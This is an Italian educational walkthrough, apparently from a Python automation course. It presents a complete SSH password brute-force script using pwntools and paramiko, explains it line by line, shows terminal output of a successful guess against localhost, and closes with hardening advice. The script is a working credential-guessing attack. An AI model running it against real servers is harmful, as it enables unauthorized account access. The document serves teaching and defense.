Ecco il documento unico e continuo in formato Markdown (`.md`), senza separazioni in blocchi distinti:

# Automating with Python — Project #1: SSH Login Brute Forcing

Guida didattica e riassunto tecnico dell'analisi del codice e dell'output a video relativo al primo progetto pratico del corso.

---

## 1. Codice Sorgente Completo (`ssh-brute.py`)

Di seguito il codice trascritto integralmente dall'editor mostrato nel video:

```python
from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1

```

---

## 2. Spiegazione Dettagliata del Codice Riga per Riga

### Inizializzazione e Import delle Librerie

* `from pwn import *`
Importa le utility della libreria specialistica **pwntools**. In questo contesto mette a disposizione la funzione `ssh()`, concepita per gestire a livello di rete la negoziazione, l'handshake e la sessione remota.
* `import paramiko`
Importa **Paramiko**, la libreria Python per il protocollo SSH su cui poggia anche pwntools. Viene importata per poter gestire in modo selettivo le eccezioni sollevate dal demone (`paramiko.ssh_exception`).
* `host = "127.0.0.1"`
Indica l'indirizzo IP del server bersaglio; qui è impostato sull'interfaccia di loopback locale (`localhost`).
* `username = "notroot"`
L'utente bersaglio su cui testare l'accesso.
* `attempts = 0`
Inizializzazione di una variabile contatore per monitorare a video l'indice progressivo dei tentativi.

### Gestione dei File e Ciclo di Scansione

* `with open("ssh-common-passwords.txt", "r") as password_list:`
Apre in lettura (`"r"`) il dizionario contenente la lista di password. Il blocco `with` garantisce la corretta chiusura del file descriptor al termine o in caso di anomalie.
* `for password in password_list:`
Itera riga per riga sul file senza caricarne l'intero contenuto in memoria.
* `password = password.strip("\n")`
Rimuove il terminatore di riga (`\n`) presente alla fine di ogni parola letta dal file, evitando che venga inviato come parte della credenziale.

### Connessione e Gestione delle Risposte (`try / except`)

* `print("[{}] Attempting password: '{}'!".format(attempts, password))`
Stampa a schermo il numero del tentativo corrente e la password in elaborazione.
* `response = ssh(host=host, user=username, password=password, timeout=1)`
Avvia il tentativo di autenticazione SSH verso il server target. Il parametro `timeout=1` impone un limite massimo di attesa di 1 secondo per non bloccare l'esecuzione in caso di mancata risposta del server.
* `if response.connected():`
Verifica se il canale è stato stabilito con successo:
* Stampa a video il messaggio di conferma: `[>] Valid password found: '...'!`.
* Rilascia la connessione aperta con `response.close()`.
* Esegue un `break` per uscire anticipatamente dal ciclo `for`.


* `response.close()`
Chiusura di sicurezza del canale.
* `except paramiko.ssh_exception.AuthenticationException:`
Intercetta specificamente l'errore di autenticazione fallita sollevato da Paramiko (password errata), impedendo il crash del programma e stampando `[X] Invalid password!`.
* `attempts += 1`
Incrementa l'indice dei tentativi prima di passare all'elemento successivo.

---

## 3. Trascrizione dell'Output del Terminale (Kali Linux)

Esecuzione del comando `python3 ssh-brute.py`:

```text
(notroot㉿kali)-[~]
$ python3 ssh-brute.py
[0] Attempting password: '123456'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[1] Attempting password: 'password'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[2] Attempting password: '12345678'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[3] Attempting password: 'qwerty'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[4] Attempting password: '123456789'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[5] Attempting password: '12345'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[6] Attempting password: '1234'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[7] Attempting password: '111111'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[8] Attempting password: '1234567'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[9] Attempting password: 'dragon'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[10] Attempting password: 'notroot'!
[+] Connecting to 127.0.0.1 on port 22: Done
[*] notroot@127.0.0.1:
    Distro    Kali 2021.1
    OS:       linux
    Arch:     amd64
    Version:  5.10.0
    ASLR:     Enabled
[>] Valid password found: 'notroot'!
[*] Closed connection to '127.0.0.1'

```

---

## 4. Note sui Meccanismi di Hardening e Difesa

Dal punto di vista sistemistico, le misure per proteggere un server da scansioni sistematiche delle credenziali SSH includono:

1. **Disabilitazione dell'Autenticazione via Password:** Nel file di configurazione `/etc/ssh/sshd_config`, impostare `PasswordAuthentication no` per obbligare l'accesso unicamente tramite chiavi crittografiche asimmetriche protette da passphrase.
2. **Sistemi di Intrusion Prevention:** Strumenti come `fail2ban` o `sshguard` analizzano i file di registro (`/var/log/auth.log`) e inseriscono temporaneamente o permanentemente nei filtri del firewall (`iptables` / `nftables`) gli indirizzi IP che accumulano tentativi falliti consecutivi.
3. **Autenticazione a Due Fattori (MFA):** Integrazione di moduli PAM (ad esempio `pam_google_authenticator` o token hardware FIDO2) per richiedere un secondo fattore oltre alla credenziale o alla chiave.
4. https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials

